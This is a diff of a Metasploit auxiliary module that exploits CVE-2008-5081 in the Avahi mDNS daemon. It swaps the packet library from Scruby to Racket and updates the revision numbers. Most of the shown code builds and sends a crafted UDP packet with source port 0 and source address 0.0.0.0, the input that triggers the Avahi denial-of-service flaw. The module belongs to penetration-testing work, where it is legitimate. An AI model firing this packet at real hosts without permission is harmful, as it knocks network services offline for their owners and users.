@@ -1,5 +1,5 @@
 ##
-# $Id: avahi-portzero.rb 6479 2009-04-13 14:33:26Z kris $
+# $Id: avahi-portzero.rb 6823 2009-07-17 20:36:40Z hdm $
 ##
 
 ##
@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'scruby'
+require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'      => 'kris katterjohn',
 			'License'     => MSF_LICENSE,
-			'Version'     => '$Revision: 6479 $',
+			'Version'     => '$Revision: 6823 $',
 			'References'  => [ [ 'CVE', '2008-5081' ] ],
 			'DisclosureDate' => 'Nov 14 2008')
 
@@ -40,23 +40,20 @@ class Metasploit3 < Msf::Auxiliary
 
 		connect_ip
 
-		pkt = (
-			Scruby::IP.new(
-				:src    => "0.0.0.0",
-				:dst    => "#{rhost}",
-				:proto  => 17,
-				:flags  => 2,
-				:len    => 28,
-				:ttl    => 128,
-				:id     => 0xbeef,
-				:chksum => 0
-			) / Scruby::UDP.new(
-				:sport  => 0,
-				:dport  => datastore['RPORT'],
-				:chksum => 0,
-				:len    => 8
-			)
-		).to_net
+		n = Racket::Racket.new
+
+		n.l3 = Racket::IPv4.new
+		n.l3.src_ip = '0.0.0.0'
+		n.l3.dst_ip = rhost
+		n.l3.protocol = 17
+		n.l3.id = 0xbeef
+		n.l3.ttl = 128
+		n.l3.flags = 2
+				
+		n.l4 = Racket::UDP.new
+		n.l4.src_port = 0
+		n.l4.dst_port = datastore['RPORT'].to_i
+		pkt = n.pack
 
 		ip_write(pkt)
 
